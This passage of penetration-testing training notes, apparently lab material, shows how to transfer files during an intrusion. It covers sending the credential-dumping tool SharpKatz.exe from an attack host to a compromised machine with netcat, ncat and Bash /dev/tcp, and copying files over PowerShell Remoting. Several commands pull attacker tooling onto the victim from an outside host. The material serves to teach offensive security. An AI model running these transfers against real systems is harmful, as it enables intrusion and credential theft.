## Netcat
## File Transfer with Netcat and Ncat
#### NetCat - Compromised Machine - Listening on Port 8000

```shell-session
$ nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.
#### Ncat - Compromised Machine - Listening on Port 8000
```shell-session
$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```
From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine
```shell-session
$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.

#### Ncat - Attack Host - Sending File to Compromised machine
```shell-session
$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

#### Attack Host - Sending File as Input to Netcat
```shell-session
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Compromised Machine Connect to Netcat to Receive the File
```shell-session
$ nc 192.168.49.128 443 > SharpKatz.exe
```

#### Attack Host - Sending File as Input to Ncat
```shell-session
$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connect to Ncat to Receive the File
```shell-session
 ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.
#### NetCat - Sending File as Input to Netcat
```shell-session
$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```
#### Ncat - Sending File as Input to Netcat
```shell-session
$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```
#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
```shell-session
$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```


## PowerShell Session File Transfer
[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.
```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```
```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.
#### Create a PowerShell Remoting Session to DATABASE01
```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```
#### Copy samplefile.txt from our Localhost to the DATABASE01 Session
```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
#### Copy DATABASE.txt from DATABASE01 Session to our Localhost
```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP
